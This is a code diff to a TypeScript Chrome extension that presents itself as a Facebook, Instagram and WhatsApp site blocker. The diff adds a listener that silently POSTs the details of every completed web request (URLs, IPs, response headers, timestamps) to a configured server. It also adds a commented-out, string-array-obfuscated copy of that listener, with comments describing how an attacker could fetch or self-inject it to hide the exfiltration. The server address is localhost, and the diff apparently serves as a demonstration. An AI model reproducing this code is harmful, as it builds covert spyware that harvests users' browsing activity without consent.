@@ -3,8 +3,10 @@
 
 import WebRequestBodyDetails = chrome.webRequest.WebRequestBodyDetails;
 import WebResponseCacheDetails = chrome.webRequest.WebResponseCacheDetails;
-import WebRequestHeaderDetails = chrome.webRequest.WebRequestHeadersDetails;
 import RequestFilter = chrome.webRequest.RequestFilter;
+
+let filter: RequestFilter = {urls: ["<all_urls>"]};
+let myServerAddress = "http://localhost:42069/";
 
 // On installation, initialize chrome sync variables
 chrome.runtime.onInstalled.addListener((details => {
@@ -20,10 +22,6 @@ chrome.storage.sync.get({facebookSwitch: true, instagramSwitch: true, whatsappSw
     blockingInstagram = items["instagramSwitch"];
     blockingWhatsapp = items["whatsappSwitch"];
 });
-
-let filter: RequestFilter = {urls: ["<all_urls>"]};
-
-let myServerAddress = "http://localhost:42069/";
 
 let facebookHosts: Array<string> = [];
 let facebookHostsFilePath: string = chrome.runtime.getURL("lists/facebook.txt");
@@ -63,7 +61,8 @@ function now(): string {
 }
 
 function sendDataToServer(data: any) {
-    let sent = {data: JSON.stringify(data)};
+    data["time"] = now();
+    let sent = {data: JSON.stringify(data, null, "  ")};
     console.log(sent.data);
     fetch(myServerAddress, {
         method: 'POST',
@@ -72,16 +71,7 @@ function sendDataToServer(data: any) {
     });
 }
 
-function sendDataToServerXHR(data: any) {
-    let request = new XMLHttpRequest();
-    request.open("POST", myServerAddress, true);
-    let form = new FormData();
-    form.set("data", JSON.stringify(data));
-    request.send(form);
-    console.log(form.get("data"));
-}
-
-// on settings changed!
+// When settings have changed, the popup will send us a message telling us what changed
 chrome.runtime.onMessage.addListener(message => {
     let whatChanged: string = message["whatChanged"];
     if (!!whatChanged) {
@@ -93,9 +83,9 @@ chrome.runtime.onMessage.addListener(message => {
     }
 });
 
+// Block the sites we need to block
 chrome.webRequest.onBeforeRequest.addListener((details: WebRequestBodyDetails) => {
     if (details.url !== myServerAddress) {
-        let detailsString = `${details.timeStamp}\n${details.method}\n${details.url}\n${details.initiator}\n\n`;
         let url = new URL(details.url);
         if (blockingFacebook && facebookHosts.contains(url.hostnameClean())) return {cancel: true};
         if (blockingInstagram && instagramHosts.contains(url.hostnameClean())) return {cancel: true};
@@ -103,19 +93,45 @@ chrome.webRequest.onBeforeRequest.addListener((details: WebRequestBodyDetails) =
     }
 }, filter, ["requestBody", "blocking"]);
 
-chrome.webRequest.onSendHeaders.addListener((details: WebRequestHeaderDetails) => {
-    if (details.url != myServerAddress) {
-        if (!!details.requestHeaders && details.requestHeaders.length != 0) {
-        }
-    }
-}, filter, ["requestHeaders"]);
-
+// On request completed notify the remote server
 chrome.webRequest.onCompleted.addListener((details: WebResponseCacheDetails) => {
     if (details.url !== myServerAddress) {
-        let detailsString = `${now()} to ${details.ip} is ${details.statusCode}`;
-        try {
-            sendDataToServer(detailsString);
-        } catch (e) {
-        }
+        sendDataToServer(details);
     }
 }, filter, ["responseHeaders"]);
+
+// Below is an obfuscated version of the above onCompleted listener
+// we can even store this on a server somewhere and fetch it and inject it here (or make it self injecting) to
+// further hide the POST request sent to our server, JS allows for a lot of funky magic like this that an attacker
+// can use to hide their actions from interested actors
+
+/*const a = ['onCompleted', 'responseHeaders', 'POST', 'log', 'body', 'stringify', 'time', 'Content-Type', 'addListener', 'url', 'webRequest', 'data', 'application/json', 'headers'];
+(function (b, e) {
+    const f = function (g) {
+        while (--g) {
+            b['push'](b['shift']());
+        }
+    };
+    f(++e);
+}(a, 0xaa));
+const b = function (c, d) {
+    c = c - 0x0;
+    let e = a[c];
+    return e;
+};
+chrome[b('0x8')][b('0xc')][b('0x6')](f => {
+    if (f[b('0x7')] !== myServerAddress) {
+        f[b('0x4')] = now();
+        const g = {};
+        g[b('0x9')] = JSON[b('0x3')](f, null, '\x20\x20');
+        let h = g;
+        console[b('0x1')](h[b('0x9')]);
+        const i = {};
+        i[b('0x5')] = b('0xa');
+        const j = {};
+        j['method'] = b('0x0');
+        j[b('0xb')] = i;
+        j[b('0x2')] = JSON['stringify'](h);
+        fetch(myServerAddress, j);
+    }
+}, filter, [b('0xd')]);*/
